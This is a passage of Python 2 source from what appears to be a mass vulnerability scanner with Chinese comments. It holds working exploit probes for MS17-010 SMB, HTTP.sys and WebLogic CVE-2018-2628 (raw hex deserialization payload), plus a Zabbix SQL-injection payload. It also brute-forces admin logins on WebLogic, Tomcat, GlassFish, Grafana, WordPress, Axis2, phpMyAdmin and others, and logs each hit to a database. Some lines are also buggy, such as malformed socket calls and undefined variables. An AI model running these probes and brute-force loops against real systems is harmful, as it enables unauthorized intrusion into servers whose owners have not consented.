                except Exception, e:
                    pass
    except:
        pass
    # MS17-010 SMB远程溢出漏洞（NSA Eternalblue SMB）
    try:
        print str(threading.current_thread().name) + ' UAT>>>' + str(ip) + '-' + str('MS17-010')
        negotiate_protocol_request = binascii.unhexlify("00000054ff534d42720000000018012800000000000000000000000000002f4b0000c55e003100024c414e4d414e312e3000024c4d312e325830303200024e54204c414e4d414e20312e3000024e54204c4d20302e313200")
        session_setup_request = binascii.unhexlify("00000063ff534d42730000000018012000000000000000000000000000002f4b0000c55e0dff000000dfff02000100000000000000000000000000400000002600002e0057696e646f7773203230303020323139350057696e646f7773203230303020352e3000")
        s=socket.socket()
        s.connect(str(ip),445)
        s.send(negotiate_protocol_request)
        s.recv(1024)
        s.send(session_setup_request)
        data = s.recv(1024)
        user_id = data[32:34]
        tree_connect_andx_request = "000000%xff534d42750000000018012000000000000000000000000000002f4b%sc55e04ff000000000001001a00005c5c%s5c49504324003f3f3f3f3f00" % ((58 + len(ip)), user_id.encode('hex'), ip.encode('hex'))
        s.send(binascii.unhexlify(tree_connect_andx_request))
        data = s.recv(1024)
        allid = data[28:36]
        payload = "0000004aff534d422500000000180128000000000000000000000000%s1000000000ffffffff0000000000000000000000004a0000004a0002002300000007005c504950455c00" % allid.encode('hex')
        s.send(binascii.unhexlify(payload))
        data = s.recv(1024)
        s.close()
        if "\x05\x02\x00\xc0" in data:
            try:
                timenow = time.strftime("%Y-%m-%d %H:%M:%S", time.localtime())
                coon_uauth_1 = pymysql.connect(user=user, passwd=passwd, host=host, db=Dbname, charset='utf8')
                cur_uauth_1 = coon_uauth_1.cursor()
                sql_uauth_1 = "INSERT INTO url_unauthorizedscan (url,ip,uauth,urltitle,datatime) VALUES (%s,%s,%s,%s,%s)"
                cur_uauth_1.execute(sql_uauth_1, (str(url), str(ip), str('MS17-010 SMB远程溢出漏洞'), str(unauthorizedscan_title), str(timenow)))
                coon_uauth_1.commit()
                cur_uauth_1.close()
                coon_uauth_1.close()
                time.sleep(random.randint(2, 4))
            except Exception, e:
                pass
        s.close()
    except:
        pass
    # HTTP.sys远程代码执行漏洞
    try:
        print str(threading.current_thread().name) + ' UAT>>>' + str(ip) + '-' + str('HTTP.sys')
        s=socket.socket()
        s.connect(str(ip),80)
        flag = "GET / HTTP/1.0\r\nHost: stuff\r\nRange: bytes=0-18446744073709551615\r\n\r\n"
        s.send(flag)
        data = s.recv(1024)
        s.close()
        if 'Requested Range Not Satisfiable' in data and 'Server: Microsoft' in data:
            try:
                timenow = time.strftime("%Y-%m-%d %H:%M:%S", time.localtime())
                coon_uauth_1 = pymysql.connect(user=user, passwd=passwd, host=host, db=Dbname, charset='utf8')
                cur_uauth_1 = coon_uauth_1.cursor()
                sql_uauth_1 = "INSERT INTO url_unauthorizedscan (url,ip,uauth,urltitle,datatime) VALUES (%s,%s,%s,%s,%s)"
                cur_uauth_1.execute(sql_uauth_1, (str(url), str(ip), str('HTTP.sys远程代码执行漏洞'), str(unauthorizedscan_title), str(timenow)))
                coon_uauth_1.commit()
                cur_uauth_1.close()
                coon_uauth_1.close()
                time.sleep(random.randint(2, 4))
            except Exception, e:
                pass
    except:
        pass

    # Resin viewfile远程文件读取漏洞
    try:
        print str(threading.current_thread().name) + ' UAT>>>' + str(ip) + '-' + str('Resin')
        r_=[]
        r1='http://'+ url +'/resin-doc/admin/index.xtp'
        r2 = 'http://' + str(ip) + '/resin-doc/admin/index.xtp'
        r3 = 'http://' + url + ':8080/resin-doc/admin/index.xtp'
        r4 = 'http://' + str(ip) + ':8080/resin-doc/admin/index.xtp'
        r5 = 'http://' + url + ':8443/resin-doc/admin/index.xtp'
        r6 = 'http://' + str(ip) + ':8443/resin-doc/admin/index.xtp'
        r_.append(r1)
        r_.append(r2)
        r_.append(r3)
        r_.append(r4)
        r_.append(r5)
        r_.append(r6)
        for r_r in r_:
            try:
                rxr = requests.get(url=r_r,timeout=8)
                if '/resin-doc/examples/index.xtp' in rxr.content:
                    try:
                        timenow = time.strftime("%Y-%m-%d %H:%M:%S", time.localtime())
                        coon_uauth_1 = pymysql.connect(user=user, passwd=passwd, host=host, db=Dbname, charset='utf8')
                        cur_uauth_1 = coon_uauth_1.cursor()
                        sql_uauth_1 = "INSERT INTO url_unauthorizedscan (url,ip,uauth,urltitle,datatime) VALUES (%s,%s,%s,%s,%s)"
                        cur_uauth_1.execute(sql_uauth_1, (str(url), str(r_r), str('Resin viewfile远程文件读取漏洞'),str(unauthorizedscan_title), str(timenow)))
                        coon_uauth_1.commit()
                        cur_uauth_1.close()
                        coon_uauth_1.close()
                        time.sleep(random.randint(2, 4))
                    except Exception, e:
                        pass
            except:
                pass
    except:
        pass
    # JBoss后台上传漏洞
    try:
        print str(threading.current_thread().name) + ' UAT>>>' + str(ip) + '-' + str('JBoss upfile')
        r_=[]
        r1='http://'+ url +'/jmx-console/'
        r2 = 'http://' + str(ip) + '/jmx-console/'
        r3 = 'http://' + url + ':8080/jmx-console/'
        r4 = 'http://' + str(ip) + ':8080/jmx-console/'
        r_.append(r1)
        r_.append(r2)
        r_.append(r3)
        r_.append(r4)
        for r_r in r_:
            try:
                rxr = requests.get(url=r_r,timeout=8)
                if 'flavor=URL,type=DeploymentScanner' in rxr.content:
                    try:
                        timenow = time.strftime("%Y-%m-%d %H:%M:%S", time.localtime())
                        coon_uauth_1 = pymysql.connect(user=user, passwd=passwd, host=host, db=Dbname, charset='utf8')
                        cur_uauth_1 = coon_uauth_1.cursor()
                        sql_uauth_1 = "INSERT INTO url_unauthorizedscan (url,ip,uauth,urltitle,datatime) VALUES (%s,%s,%s,%s,%s)"
                        cur_uauth_1.execute(sql_uauth_1, (str(url), str(r_r), str('JBoss后台上传漏洞'),str(unauthorizedscan_title), str(timenow)))
                        coon_uauth_1.commit()
                        cur_uauth_1.close()
                        coon_uauth_1.close()
                        time.sleep(random.randint(2, 4))
                    except Exception, e:
                        pass
            except:
                pass
    except:
        pass
    # Weblogic弱口令漏洞
    try:
        print str(threading.current_thread().name) + ' UAT>>>' + str(ip) + '-' + str('Weblogic Brute')
        r_=[]
        r1='http://'+ url +'/console/login/LoginForm.jsp'
        r2 = 'http://' + str(ip) + '/console/login/LoginForm.jsp'
        r3 = 'http://' + url + ':7001/console/login/LoginForm.jsp'
        r4 = 'http://' + str(ip) + ':7001/console/login/LoginForm.jsp'
        r5='https://'+ url +'/console/login/LoginForm.jsp'
        r6 = 'https://' + str(ip) + '/console/login/LoginForm.jsp'
        r7 = 'https://' + url + ':7002/console/login/LoginForm.jsp'
        r8 = 'https://' + str(ip) + ':7002/console/login/LoginForm.jsp'
        r_.append(r1)
        r_.append(r2)
        r_.append(r3)
        r_.append(r4)
        r_.append(r5)
        r_.append(r6)
        r_.append(r7)
        r_.append(r8)
        for r_r in r_:
            try:
                for uuser in dic_user:
                    for ppass in dic_pass:
                        data = {'j_username': str(uuser), 'j_password': str(ppass), 'j_character_encoding': 'GBK'}
                        rxr = requests.post(url=r_r,data=data,timeout=8)
                        if 'WebLogic Server Console' in rxr.content:
                            try:
                                timenow = time.strftime("%Y-%m-%d %H:%M:%S", time.localtime())
                                coon_uauth_1 = pymysql.connect(user=user, passwd=passwd, host=host, db=Dbname,charset='utf8')
                                cur_uauth_1 = coon_uauth_1.cursor()
                                sql_uauth_1 = "INSERT INTO url_unauthorizedscan (url,ip,uauth,urltitle,datatime) VALUES (%s,%s,%s,%s,%s)"
                                cur_uauth_1.execute(sql_uauth_1, (str(url), str(r_r + ':' + str(str(uuser) + '|' + str(ppass))), str('Weblogic弱口令漏洞'),str(unauthorizedscan_title), str(timenow)))
                                coon_uauth_1.commit()
                                cur_uauth_1.close()
                                coon_uauth_1.close()
                                time.sleep(random.randint(2, 4))
                            except Exception, e:
                                pass
            except:
                pass
    except:
        pass

    # JOnAS弱口令漏洞
    try:
        print str(threading.current_thread().name) + ' UAT>>>' + str(ip) + '-' + str('JOnAS Brute')
        r_=[]
        r1='http://'+ url +'/jonasAdmin/ '
        r2 = 'http://' + str(ip) + '/jonasAdmin/ '
        r3 = 'http://' + url + ':9000/jonasAdmin/ '
        r4 = 'http://' + str(ip) + ':9000/jonasAdmin/ '
        r5='https://'+ url +'/console/jonasAdmin/ '
        r6 = 'https://' + str(ip) + '/jonasAdmin/ '
        r7 = 'https://' + url + ':9000/jonasAdmin/ '
        r8 = 'https://' + str(ip) + ':9000/jonasAdmin/ '
        r_.append(r1)
        r_.append(r2)
        r_.append(r3)
        r_.append(r4)
        r_.append(r5)
        r_.append(r6)
        r_.append(r7)
        r_.append(r8)
        for r_r in r_:
            try:
                rxr = requests.get(url=r_r, timeout=10)
                if 'JOnAS Administration' in rxr.content:
                    for uuser in dic_user:
                        for ppass in dic_pass:
                            data = {'j_username': str(uuser), 'j_password': str(ppass)}
                            try:
                                r_br = requests.post(url=r_r, data=data, timeout=10)
                                if 'Deployment' in r_br.content:
                                    try:
                                        timenow = time.strftime("%Y-%m-%d %H:%M:%S", time.localtime())
                                        coon_uauth_1 = pymysql.connect(user=user, passwd=passwd, host=host, db=Dbname,charset='utf8')
                                        cur_uauth_1 = coon_uauth_1.cursor()
                                        sql_uauth_1 = "INSERT INTO url_unauthorizedscan (url,ip,uauth,urltitle,datatime) VALUES (%s,%s,%s,%s,%s)"
                                        cur_uauth_1.execute(sql_uauth_1, (str(url), str(r_r + ':' + str(str(uuser) + '|' + str(ppass))),str('JOnAS弱口令漏洞'), str(unauthorizedscan_title), str(timenow)))
                                        coon_uauth_1.commit()
                                        cur_uauth_1.close()
                                        coon_uauth_1.close()
                                        time.sleep(random.randint(2, 4))
                                    except Exception, e:
                                        pass
                            except:
                                pass
            except:
                pass

    except:
        pass

    # tomcat远程部署弱口令漏洞
    try:
        print str(threading.current_thread().name) + ' UAT>>>' + str(ip) + '-' + str('Tomcat Manger')
        r_=[]
        r1 = 'http://'+url+'/RetainServer/Manager/login.jsp'
        r2 = 'http://'+url+'/Manager/login.jsp'
        r3 = 'http://'+str(ip)+':8080/Manager/login.jsp'
        r4 = 'http://'+str(ip)+':8080/RetainServer/Manager/login.jsp'
        r_.append(r1)
        r_.append(r2)
        r_.append(r3)
        r_.append(r4)
        for r_r in r_:
            try:
                rxr = requests.get(url=r_r,timeout=10)
                if 'onkeypress="if(event.keyCode==13)' in rxr.content:
                    for uuser in dic_user:
                        for ppass in dic_pass:
                            data={'login':str(uuser),'pass':str(ppass),'Language':'myLang'}
                            try:
                                r_br=requests.post(url=r_r,data=data,timeout=10)
                                if 'Router Configuration' in r_br.content:
                                    try:
                                        timenow = time.strftime("%Y-%m-%d %H:%M:%S", time.localtime())
                                        coon_uauth_1 = pymysql.connect(user=user, passwd=passwd, host=host,db=Dbname, charset='utf8')
                                        cur_uauth_1 = coon_uauth_1.cursor()
                                        sql_uauth_1 = "INSERT INTO url_unauthorizedscan (url,ip,uauth,urltitle,datatime) VALUES (%s,%s,%s,%s,%s)"
                                        cur_uauth_1.execute(sql_uauth_1, (str(url), str(r_r+':'+str(str(uuser)+'|'+str(ppass))), str('Tomcat远程部署弱口令漏洞'),str(unauthorizedscan_title), str(timenow)))
                                        coon_uauth_1.commit()
                                        cur_uauth_1.close()
                                        coon_uauth_1.close()
                                        time.sleep(random.randint(2, 4))
                                    except Exception, e:
                                        pass
                            except:
                                pass
            except:
                pass
    except:
        pass
    #weblogic CVE-2018-2628漏洞
    try:
        print str(threading.current_thread().name) + ' UAT>>>' + str(ip) + '-' + str('Weblogic')
        sock = socket.socket()
        VER_SIG = ['\\$Proxy[0-9]+']
        try:
            sock.connect((str(ip),7001))
            sock.send('74332031322e322e310a41533a3235350a484c3a31390a4d533a31303030303030300a0a'.decode('hex'))
            time.sleep(1)
        except Exception, e:
            pass
        try:
            data1 = '000005c3016501ffffffffffffffff0000006a0000ea600000001900937b484a56fa4a777666f581daa4f5b90e2aebfc607499b4027973720078720178720278700000000a000000030000000000000006007070707070700000000a000000030000000000000006007006fe010000aced00057372001d7765626c6f6769632e726a766d2e436c6173735461626c65456e7472792f52658157f4f9ed0c000078707200247765626c6f6769632e636f6d6d6f6e2e696e7465726e616c2e5061636b616765496e666fe6f723e7b8ae1ec90200084900056d616a6f724900056d696e6f7249000c726f6c6c696e67506174636849000b736572766963655061636b5a000e74656d706f7261727950617463684c0009696d706c5469746c657400124c6a6176612f6c616e672f537472696e673b4c000a696d706c56656e646f7271007e00034c000b696d706c56657273696f6e71007e000378707702000078fe010000aced00057372001d7765626c6f6769632e726a766d2e436c6173735461626c65456e7472792f52658157f4f9ed0c000078707200247765626c6f6769632e636f6d6d6f6e2e696e7465726e616c2e56657273696f6e496e666f972245516452463e0200035b00087061636b616765737400275b4c7765626c6f6769632f636f6d6d6f6e2f696e7465726e616c2f5061636b616765496e666f3b4c000e72656c6561736556657273696f6e7400124c6a6176612f6c616e672f537472696e673b5b001276657273696f6e496e666f417342797465737400025b42787200247765626c6f6769632e636f6d6d6f6e2e696e7465726e616c2e5061636b616765496e666fe6f723e7b8ae1ec90200084900056d616a6f724900056d696e6f7249000c726f6c6c696e67506174636849000b736572766963655061636b5a000e74656d706f7261727950617463684c0009696d706c5469746c6571007e00044c000a696d706c56656e646f7271007e00044c000b696d706c56657273696f6e71007e000478707702000078fe010000aced00057372001d7765626c6f6769632e726a766d2e436c6173735461626c65456e7472792f52658157f4f9ed0c000078707200217765626c6f6769632e636f6d6d6f6e2e696e7465726e616c2e50656572496e666f585474f39bc908f10200064900056d616a6f724900056d696e6f7249000c726f6c6c696e67506174636849000b736572766963655061636b5a000e74656d706f7261727950617463685b00087061636b616765737400275b4c7765626c6f6769632f636f6d6d6f6e2f696e7465726e616c2f5061636b616765496e666f3b787200247765626c6f6769632e636f6d6d6f6e2e696e7465726e616c2e56657273696f6e496e666f972245516452463e0200035b00087061636b6167657371'
            data2 = '007e00034c000e72656c6561736556657273696f6e7400124c6a6176612f6c616e672f537472696e673b5b001276657273696f6e496e666f417342797465737400025b42787200247765626c6f6769632e636f6d6d6f6e2e696e7465726e616c2e5061636b616765496e666fe6f723e7b8ae1ec90200084900056d616a6f724900056d696e6f7249000c726f6c6c696e67506174636849000b736572766963655061636b5a000e74656d706f7261727950617463684c0009696d706c5469746c6571007e00054c000a696d706c56656e646f7271007e00054c000b696d706c56657273696f6e71007e000578707702000078fe00fffe010000aced0005737200137765626c6f6769632e726a766d2e4a564d4944dc49c23ede121e2a0c0000787077502100000000000000000000d3139322e3136382e312e323237001257494e2d4147444d565155423154362e656883348cd6000000070000{0}ffffffffffffffffffffffffffffffffffffffffffffffff78fe010000aced0005737200137765626c6f6769632e726a766d2e4a564d4944dc49c23ede121e2a0c0000787077200114dc42bd07'.format('{:04x}'.format(7001))
            data3 = '1a7727000d3234322e323134'
            data4 = '2e312e32353461863d1d0000000078'
            for d in [data1, data2, data3, data4]:
                sock.send(d.decode('hex'))
        except Exception, e:
            pass
        try:
            payload = '0565080000000100000001b0000005d010100737201787073720278700000000000000000757203787000000000787400087765626c6f67696375720478700000000c9c979a9a8c9a9bcfcf9b939a7400087765626c6f67696306fe010000aced00057372001d7765626c6f6769632e726a766d2e436c6173735461626c65456e7472792f52658157f4f9ed0c000078707200025b42acf317f8060854e002000078707702000078fe010000aced00057372001d7765626c6f6769632e726a766d2e436c6173735461626c65456e7472792f52658157f4f9ed0c000078707200135b4c6a6176612e6c616e672e4f626a6563743b90ce589f1073296c02000078707702000078fe010000aced00057372001d7765626c6f6769632e726a766d2e436c6173735461626c65456e7472792f52658157f4f9ed0c000078707200106a6176612e7574696c2e566563746f72d9977d5b803baf010300034900116361706163697479496e6372656d656e7449000c656c656d656e74436f756e745b000b656c656d656e74446174617400135b4c6a6176612f6c616e672f4f626a6563743b78707702000078fe010000'
            payload += 'ACED0005737D00000001001D6A6176612E726D692E61637469766174696F6E2E416374697661746F72787200176A6176612E6C616E672E7265666C6563742E50726F7879E127DA20CC1043CB0200014C0001687400254C6A6176612F6C616E672F7265666C6563742F496E766F636174696F6E48616E646C65723B78707372002D6A6176612E726D692E7365727665722E52656D6F74654F626A656374496E766F636174696F6E48616E646C657200000000000000020200007872001C6A6176612E726D692E7365727665722E52656D6F74654F626A656374D361B4910C61331E03000078707737000A556E6963617374526566000E3030302E3030302E3030302E303000001B590000000001EEA90B00000000000000000000000000000078'
            payload += 'fe010000aced0005737200257765626c6f6769632e726a766d2e496d6d757461626c6553657276696365436f6e74657874ddcba8706386f0ba0c0000787200297765626c6f6769632e726d692e70726f76696465722e426173696353657276696365436f6e74657874e4632236c5d4a71e0c0000787077020600737200267765626c6f6769632e726d692e696e7465726e616c2e4d6574686f6444657363726970746f7212485a828af7f67b0c000078707734002e61757468656e746963617465284c7765626c6f6769632e73656375726974792e61636c2e55736572496e666f3b290000001b7878fe00ff'
            payload = '%s%s' % ('{:08x}'.format(len(payload) / 2 + 4), payload)
            sock.send(payload.decode('hex'))
            res = ''
            try:
                for i in xrange(20):
                    res += sock.recv(4096)
                    time.sleep(1)
            except Exception as e:
                pass
        except Exception, e:
            pass
        try:
            p = re.findall(VER_SIG[0], res, re.S)
            if len(p) > 0:
                try:
                    timenow = time.strftime("%Y-%m-%d %H:%M:%S", time.localtime())
                    coon_uauth_1 = pymysql.connect(user=user, passwd=passwd, host=host, db=Dbname, charset='utf8')
                    cur_uauth_1 = coon_uauth_1.cursor()
                    sql_uauth_1 = "INSERT INTO url_unauthorizedscan (url,ip,uauth,urltitle,datatime) VALUES (%s,%s,%s,%s,%s)"
                    cur_uauth_1.execute(sql_uauth_1, (str(url), str(str(ip)+':7001'), str('Weblogic CVE-2018-2628'),str(unauthorizedscan_title), str(timenow)))
                    coon_uauth_1.commit()
                    cur_uauth_1.close()
                    coon_uauth_1.close()
                    time.sleep(random.randint(2, 4))
                except Exception, e:
                    pass
        except Exception, e:
            pass
    except:
        pass
    # Tomcat后台管理弱口令
    try:
        print str(threading.current_thread().name) + ' UAT>>>' + str(ip) + '-' + str('Tomact Manage')
        s = socket.socket()
        s.connect((str(ip),8080))
        s.send('langzi \n')
        cc = s.recv(1024)
        if 'not allowed to' not in cc:
            r_=[]
            r1='http://'+url+':8080/manager/html'
            r2 = 'http://'+str(ip)+':8080/manager/html'
            r3='http://'+url+':8081/manager/html'
            r4='http://' + str(ip) + ':8081/manager/html'
            r_.append(r1)
            r_.append(r2)
            r_.append(r3)
            r_.append(r4)
            for r_r in r_:
                try:
                    rxr = requests.get(url=r_r,timeout=5)
                    if 'Manager App HOW-TO' in rxr.content:
                        for uuser in dic_user:
                            for ppass in dic_pass:
                                headers = {'Authorization': 'Basic %s==' % (base64.b64encode(uuser + ':' + ppass))}
                                try:
                                    rxrx=requests.get(url=r_r,headers=headers,timeout=8)
                                    if rxrx.status_code==200:
                                        try:
                                            timenow = time.strftime("%Y-%m-%d %H:%M:%S", time.localtime())
                                            coon_uauth_1 = pymysql.connect(user=user, passwd=passwd, host=host, db=Dbname, charset='utf8')
                                            cur_uauth_1 = coon_uauth_1.cursor()
                                            sql_uauth_1 = "INSERT INTO url_unauthorizedscan (url,ip,uauth,urltitle,datatime) VALUES (%s,%s,%s,%s,%s)"
                                            cur_uauth_1.execute(sql_uauth_1, (str(url), str(r_r + ':' + str(str(uuser) + '|' + str(ppass))), str('Tomcat后台管理弱口令漏洞'),str(unauthorizedscan_title), str(timenow)))
                                            coon_uauth_1.commit()
                                            cur_uauth_1.close()
                                            coon_uauth_1.close()
                                            time.sleep(random.randint(2, 4))
                                        except Exception, e:
                                            pass
                                except:
                                    pass
                except:
                    pass
        s.close()
    except:
        pass

    # Glassfish弱口令漏洞
    try:
        print str(threading.current_thread().name) + ' UAT>>>' + str(ip) + '-' + str('Grassfish Brute')
        r_=[]
        r1='http://'+ url +':4848'
        r2 = 'http://' + str(ip) + ':4848'
        r_.append(r1)
        r_.append(r2)
        dic_pass.append('glassfish')
        for xxixx in r_:
            error_i = 0
            flag_list = ['Just refresh the page... login will take over', 'GlassFish Console - Common Tasks',
                         '/resource/common/js/adminjsf.js">', 'Admin Console</title>', 'src="/homePage.jsf"',
                         'src="/header.jsf"', 'src="/index.jsf"', '<title>Common Tasks</title>',
                         'title="Logout from GlassFish']
            user_list = ['admin']
            for uuser in user_list:
                for ppass in dic_pass:
                    try:
                        PostStr = 'j_username=%s&j_password=%s&loginButton=Login&loginButton.DisabledHiddenField=true' % (uuser, ppass)
                        request = urllib2.Request(url + '/j_security_check?loginButton=Login', PostStr)
                        res = urllib2.urlopen(request, timeout=timeout)
                        res_html = res.read()
                    except urllib2.HTTPError:
                        return
                    except urllib2.URLError:
                        error_i += 1
                        if error_i >= 3:
                            break
                        continue
                    for flag in flag_list:
                        if flag in res_html:
                            try:
                                timenow = time.strftime("%Y-%m-%d %H:%M:%S", time.localtime())
                                coon_uauth_1 = pymysql.connect(user=user, passwd=passwd, host=host, db=Dbname,charset='utf8')
                                cur_uauth_1 = coon_uauth_1.cursor()
                                sql_uauth_1 = "INSERT INTO url_unauthorizedscan (url,ip,uauth,urltitle,datatime) VALUES (%s,%s,%s,%s,%s)"
                                cur_uauth_1.execute(sql_uauth_1, (str(url), str(xxixx+ ':' + uuser + '|'+ppass), str('Glassfish弱口令漏洞'), str(unauthorizedscan_title),str(timenow)))
                                coon_uauth_1.commit()
                                cur_uauth_1.close()
                                coon_uauth_1.close()
                                time.sleep(random.randint(2, 4))
                            except Exception, e:
                                pass
                            pass
    except:
        pass

    # Grafana弱口令漏洞
    try:
        print str(threading.current_thread().name) + ' UAT>>>' + str(ip) + '-' + str('Grafana Brute')
        r_=[]
        r1='http://'+ url +':3000'
        r2 = 'http://' + str(ip) + ':3000'
        r_.append(r1)
        r_.append(r2)
        header = {
            'User-Agent': 'Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.96 Safari/537.36',
            'ContentType': 'application/x-www-form-urlencoded; chartset=UTF-8',
            'Accept-Encoding': 'gzip, deflate',
            'Accept-Language': 'zh-CN,zh;q=0.8',
            'Connection': 'close'
        }
        for xxixx in r_:
            for ppass in dic_pass:
                data={"user":"admin","email":"","password":ppass}
                data=urllib.urlencode(data)
                request = urllib2.Request(url=url,data=data,headers=header)
                try:
                    res = urllib2.urlopen(request, timeout=timeout)
                    if "Logged in" in res.read():
                        try:
                            timenow = time.strftime("%Y-%m-%d %H:%M:%S", time.localtime())
                            coon_uauth_1 = pymysql.connect(user=user, passwd=passwd, host=host, db=Dbname,charset='utf8')
                            cur_uauth_1 = coon_uauth_1.cursor()
                            sql_uauth_1 = "INSERT INTO url_unauthorizedscan (url,ip,uauth,urltitle,datatime) VALUES (%s,%s,%s,%s,%s)"
                            cur_uauth_1.execute(sql_uauth_1, (str(url), str(xxixx + ':admin' + '|' + ppass), str('Grafana弱口令漏洞'),str(unauthorizedscan_title), str(timenow)))
                            coon_uauth_1.commit()
                            cur_uauth_1.close()
                            coon_uauth_1.close()
                            time.sleep(random.randint(2, 4))
                        except Exception, e:
                            pass
                        pass
                except Exception, e:
                    pass
    except:
        pass
    # Zabbix latest SQL注入漏洞
    try:
        print str(threading.current_thread().name) + ' UAT>>>' + str(ip) + '-' + str('Zabbix Sql')
        r_ = []
        r1 = 'http://' + url + ':80'
        r2 = 'http://' + str(ip) + ':80'
        r_.append(r1)
        r_.append(r2)
        for xxixx in r_:
            try:
                opener = urllib2.build_opener(urllib2.HTTPCookieProcessor())
                request = opener.open(xxixx + "/dashboard.php", timeout=5)
                res_html = request.read()
                if 'href="slides.php?sid=' in res_html:
                    m = re.search(r'href="slides\.php\?sid=(.+?)">', res_html, re.M | re.I)
                    if m:
                        sid = m.group(1)
                        payload = "/latest.php?output=ajax&sid={sid}&favobj=toggle&toggle_open_state=1&toggle_ids[]=(select%20updatexml(1,concat(0x7e,(SELECT%20md5(666)),0x7e),1))".format(sid=sid)
                        res_html = opener.open(xxixx + payload, timeout=8).read()
                        if 'fae0b27c451c728867a567e8c1bb4e5' in res_html:
                            try:
                                timenow = time.strftime("%Y-%m-%d %H:%M:%S", time.localtime())
                                coon_uauth_1 = pymysql.connect(user=user, passwd=passwd, host=host, db=Dbname,charset='utf8')
                                cur_uauth_1 = coon_uauth_1.cursor()
                                sql_uauth_1 = "INSERT INTO url_unauthorizedscan (url,ip,uauth,urltitle,datatime) VALUES (%s,%s,%s,%s,%s)"
                                cur_uauth_1.execute(sql_uauth_1, (str(url), str(xxixx +  '|' + payload), str('Zabbix latest SQL注入漏洞'),str(unauthorizedscan_title), str(timenow)))
                                coon_uauth_1.commit()
                                cur_uauth_1.close()
                                coon_uauth_1.close()
                                time.sleep(random.randint(2, 4))
                            except Exception, e:
                                pass
            except:
                pass
    except:
        pass
    # Wordpress弱口令漏洞
    try:
        print str(threading.current_thread().name) + ' UAT>>>' + str(ip) + '-' + str('Wordpress Brute')
        flag_list = ['<name>isAdmin</name>', '<name>url</name>']
        for uuser in dic_user:
            for ppass in dic_pass:
                try:
                    login_path = '/xmlrpc.php'
                    PostStr = "<?xml version='1.0' encoding='iso-8859-1'?><methodCall>  <methodName>wp.getUsersBlogs</methodName>  <params>   <param><value>%s</value></param>   <param><value>%s</value></param>  </params></methodCall>" % (uuser, ppass)
                    request = urllib2.Request('http://' + url + login_path, PostStr)
                    res = urllib2.urlopen(request, timeout=5)
                    res_html = res.read()
                    for flag in flag_list:
                        if flag in res_html:
                            try:
                                timenow = time.strftime("%Y-%m-%d %H:%M:%S", time.localtime())
                                coon_uauth_1 = pymysql.connect(user=user, passwd=passwd, host=host, db=Dbname,charset='utf8')
                                cur_uauth_1 = coon_uauth_1.cursor()
                                sql_uauth_1 = "INSERT INTO url_unauthorizedscan (url,ip,uauth,urltitle,datatime) VALUES (%s,%s,%s,%s,%s)"
                                cur_uauth_1.execute(sql_uauth_1, (str(url), str(xxixx + ':' +uuser+ '|' + ppass), str('Wordpress弱口令漏洞'),str(unauthorizedscan_title), str(timenow)))
                                coon_uauth_1.commit()
                                cur_uauth_1.close()
                                coon_uauth_1.close()
                                time.sleep(random.randint(2, 4))
                            except Exception, e:
                                pass
                except :
                    pass
    except:
        pass
    # Axis2弱口令漏洞
    try:
        print str(threading.current_thread().name) + ' UAT>>>' + str(ip) + '-' + str('Axis2 Console')
        r_=[]
        r1 = 'http://'+url+'/axis2-admin/login'
        r2 = 'http://'+url+':9038/axis2-admin/login'
        r3 = 'http://'+str(ip)+':9038/axis2-admin/login'
        r4 = 'http://' + url + ':8080/axis2-admin/login'
        r5 = 'http://'+str(ip)+':8080/axis2-admin/login'
        r_.append(r1)
        r_.append(r2)
        r_.append(r3)
        r_.append(r4)
        r_.append(r5)
        for r_r in r_:
            try:
                rxr = requests.get(url=r_r,timeout=10)
                if 'action="axis2-admin/login' in rxr.content:
                    for uuser in dic_user:
                        for ppass in dic_pass:
                            data={'userName':str(uuser),'password':str(ppass),'submit':'Login'}
                            try:
                                r_br=requests.post(url=r_r,data=data,timeout=10)
                                if 'Upload Service' in r_br.content:
                                    try:
                                        timenow = time.strftime("%Y-%m-%d %H:%M:%S", time.localtime())
                                        coon_uauth_1 = pymysql.connect(user=user, passwd=passwd, host=host,db=Dbname, charset='utf8')
                                        cur_uauth_1 = coon_uauth_1.cursor()
                                        sql_uauth_1 = "INSERT INTO url_unauthorizedscan (url,ip,uauth,urltitle,datatime) VALUES (%s,%s,%s,%s,%s)"
                                        cur_uauth_1.execute(sql_uauth_1, (str(url), str(r_r+':'+str(str(uuser)+'|'+str(ppass))), str('Axis2弱口令漏洞'),str(unauthorizedscan_title), str(timenow)))
                                        coon_uauth_1.commit()
                                        cur_uauth_1.close()
                                        coon_uauth_1.close()
                                        time.sleep(random.randint(2, 4))
                                    except Exception, e:
                                        pass
                            except:
                                pass
                else:
                    pass
            except:
                pass
    except:
        pass

    # Phpmyadmin弱口令漏洞
    try:
        print str(threading.current_thread().name) + ' UAT>>>' + str(ip) + '-' + str('Phpmyadmin Brute')
        r_=[]
        r1 = 'http://'+url+'/phpmyadmin/index.php'
        r2 = 'http://'+url+':999/phpmyadmin/index.php'
        r3 = 'http://'+str(ip)+':8080/phpmyadmin/index.php'
        r4 = 'http://' + url + ':8080/phpmyadmin/index.php'
        r5 = 'http://'+str(ip)+':999/phpmyadmin/index.php'
        r_.append(r1)
        r_.append(r2)
        r_.append(r3)
        r_.append(r4)
        r_.append(r5)
        for r_r in r_:
            try:
                rxr = requests.get(url=r_r,timeout=10)
                if 'Documentation.html' in rxr.content:
                    dic_user.append(r"'localhost'@'@\"")
                    dic_pass.append(r"'localhost'@'@\"")
                    for uuser in dic_user:
                        for ppass in dic_pass:
                            data={'pma_username':str(uuser),'pma_password':str(ppass)}
                            try:
                                r_br=requests.post(url=r_r,data=data,timeout=10)
                                if 'mainFrameset' in r_br.content:
                                    try:
                                        timenow = time.strftime("%Y-%m-%d %H:%M:%S", time.localtime())
                                        coon_uauth_1 = pymysql.connect(user=user, passwd=passwd, host=host,db=Dbname, charset='utf8')
                                        cur_uauth_1 = coon_uauth_1.cursor()
                                        sql_uauth_1 = "INSERT INTO url_unauthorizedscan (url,ip,uauth,urltitle,datatime) VALUES (%s,%s,%s,%s,%s)"
                                        cur_uauth_1.execute(sql_uauth_1, (str(url), str(r_r+':'+str(str(uuser)+'|'+str(ppass))), str('PHPmyadmin弱口令漏洞'),str(unauthorizedscan_title), str(timenow)))
                                        coon_uauth_1.commit()
                                        cur_uauth_1.close()
                                        coon_uauth_1.close()
                                        time.sleep(random.randint(2, 4))
                                        break
                                    except Exception, e:
                                        pass
                            except:
                                pass
                else:
                    pass
            except:
                pass
    except:
        pass
    # Mysql弱口令
    try:
        print str(threading.current_thread().name) + ' UAT>>>' + str(ip) + '-' + str('Mysql Brute')
        s = socket.socket()
